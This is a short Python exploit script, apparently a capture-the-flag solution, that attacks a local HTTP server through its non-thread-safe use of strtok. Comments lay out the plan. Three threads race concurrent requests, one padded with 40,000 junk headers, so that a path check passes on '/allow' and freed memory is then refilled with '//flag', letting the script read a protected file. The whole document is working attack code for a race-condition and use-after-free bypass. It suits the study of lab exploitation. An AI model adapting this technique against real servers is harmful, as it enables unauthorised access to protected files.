#!/usr/bin/env python3

import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py

# General attack ideea:
# strtok is used, which is not thread safe
# we need the following thing to happen:
#   t1: strtok(b'GET /ignore_me HTTP/1.0')
#       => now strtok internally stores pointer to /ingore_me HTTP/1.0
#   attacker_thread_A: strtok(b'GET /allow HTTP/1.0\r\n\r\n')
#       => now strtok internally stores pointer to /allow HTTP/1.0
#   t1: strtok(NULL) returns /allow and checks pass :)
#   attacker_thread_A: strtok(NULL) returns NULL and error => free()'s string b'GET /allow HTTP/1.0\r\n\r\n'
#   attacker_thread_B: now store b'GET //flag HTTP/1.0\r\n' in same memory location (t1 still points there and now to /flag)
#   t1: now accesses the file and prints /flag

def attacker_thread_t():
    while(True):            
        with socket.create_connection(('127.0.0.1', 1024)) as so:  
            payload = b'GET /ignore_me HTTP/1.0\r\n' + b"Junk-Header: ignore_me\r\n" * 40000 + b'\r\n'
            so.sendall(payload)
            potential_flag = so.recv(1000, socket.MSG_WAITALL)
            if b'softsec' in potential_flag:
                print(potential_flag)


def attacker_thread_A():
    while(True):
        with socket.create_connection(('127.0.0.1', 1024)) as so:
            so.sendall(b'GET /allow HTTP/1.0\r\n\r\n')
            so.recv(1024)


def attacker_thread_B():
    while(True):
        with socket.create_connection(('127.0.0.1', 1024)) as so:
            so.sendall(b'GET //flag HTTP/1.0\r\n\r\n')
            so.recv(1024)


t1 = threading.Thread(target=attacker_thread_t)
t2 = threading.Thread(target=attacker_thread_A)
t3 = threading.Thread(target=attacker_thread_B)
t1.start()
t2.start()
t3.start()

t1.join()

